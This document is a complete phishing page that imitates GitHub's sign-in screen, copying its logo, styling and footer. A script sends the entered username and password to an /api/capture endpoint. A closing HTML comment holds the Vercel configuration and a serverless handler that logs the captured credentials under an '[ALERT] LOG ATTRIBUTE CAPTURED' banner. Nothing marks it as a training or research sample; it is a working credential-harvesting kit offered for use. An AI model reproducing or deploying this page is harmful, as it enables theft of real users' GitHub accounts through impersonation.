<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
            background-color: #f6f8fa;
            color: #24292f;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            width: 100%;
            max-width: 340px;
            background-color: #ffffff;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 16px;
        }
        .github-logo {
            fill: #24292f;
            display: block;
            margin: 0 auto;
        }
        h1 {
            font-size: 16px;
            font-weight: 300;
            text-align: center;
            margin: 16px 0;
            color: #24292f;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .label-with-link {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        label {
            font-size: 14px;
            font-weight: 400;
            color: #24292f;
        }
        .forgot-link {
            font-size: 12px;
            color: #0969da;
            text-decoration: none;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .form-control {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            color: #24292f;
            background-color: #ffffff;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            outline: none;
            box-shadow: inset 0 1px 0 rgba(208, 215, 222, 0.2);
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .form-control:focus {
            border-color: #0969da;
            box-shadow: inset 0 0 0 1px #0969da;
        }
        .btn-primary {
            width: 100%;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 20px;
            color: #ffffff;
            background-color: #2da44e;
            border: 1px solid rgba(27, 31, 36, 0.15);
            border-radius: 6px;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s;
        }
        .btn-primary:hover {
            background-color: #2c974b;
        }
        .login-footer {
            text-align: center;
            font-size: 14px;
            color: #24292f;
        }
        .login-footer a {
            color: #0969da;
            text-decoration: none;
        }
        .login-footer a:hover {
            text-decoration: underline;
        }
        .site-footer {
            margin-top: 40px;
            font-size: 12px;
            color: #57606a;
            text-align: center;
        }
        .footer-links {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
        }
        .footer-links a {
            color: #0969da;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <svg height="32" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="32" class="github-logo">
        <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
    </svg>
    <h1>Sign in to GitHub</h1>
    <form id="loginForm">
        <div class="input-group">
            <label for="username">Username or email address</label>
            <input type="text" id="username" class="form-control" required autocomplete="off">
        </div>
        <div class="input-group">
            <div class="label-with-link">
                <label for="password">Password</label>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <input type="password" id="password" class="form-control" required autocomplete="off">
        </div>
        <button type="submit" class="btn-primary">Sign in</button>
    </form>
    <div class="login-footer" style="margin-top: 16px;">
        <p>New to GitHub? <a href="#">Create an account</a>.</p>
    </div>
</div>

<footer class="site-footer">
    <ul class="footer-links">
        <li><a href="#">Terms</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Security</a></li>
        <li><a href="#">Contact GitHub</a></li>
    </ul>
</footer>

<script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const usernameVal = document.getElementById('username').value;
        const passwordVal = document.getElementById('password').value;

        try {
            const response = await fetch('/api/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    user: usernameVal,
                    pass: passwordVal
                })
            });

            if (response.ok) {
                alert('Request logged. Check Vercel Dashboard!');
                document.getElementById('loginForm').reset();
            } else {
                alert('Error payload status: ' + response.status);
            }
        } catch (err) {
            console.error('Network execution failure:', err);
        }
    });
</script>

<!-- 
  ==========================================
  VERCEL CONFIGURATION (vercel.json)
  ==========================================
  {
    "version": 2,
    "rewrites": [
      {
        "source": "/api/capture",
        "destination": "/api/capture.js"
      }
    ]
  }

  ==========================================
  API ROUTE (api/capture.js)
  ==========================================
  export default async function handler(req, res) {
      res.setHeader('Access-Control-Allow-Origin', '*');
      res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
      res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

      if (req.method === 'OPTIONS') {
          return res.status(200).end();
      }

      if (req.method === 'POST') {
          let body = '';

          if (typeof req.body === 'object') {
              body = req.body;
          } else {
              try {
                  body = JSON.parse(req.body);
              } catch (e) {
                  const buffers = [];
                  for await (const chunk of req) {
                      buffers.push(chunk);
                  }
                  const rawString = Buffer.concat(buffers).toString();
                  try {
                      body = JSON.parse(rawString);
                  } catch (err) {
                      body = {};
                  }
              }
          }

          const username = body.user || 'Not Provided';
          const password = body.pass || 'Not Provided';

          console.log(`\n====================================`);
          console.log(`[ALERT] LOG ATTRIBUTE CAPTURED`);
          console.log(`USER : ${username}`);
          console.log(`PASS : ${password}`);
          console.log(`====================================\n`);

          return res.status(200).json({ status: 'success' });
      }

      return res.status(405).json({ message: 'Method Not Allowed' });
  }
-->
</body>
</html>
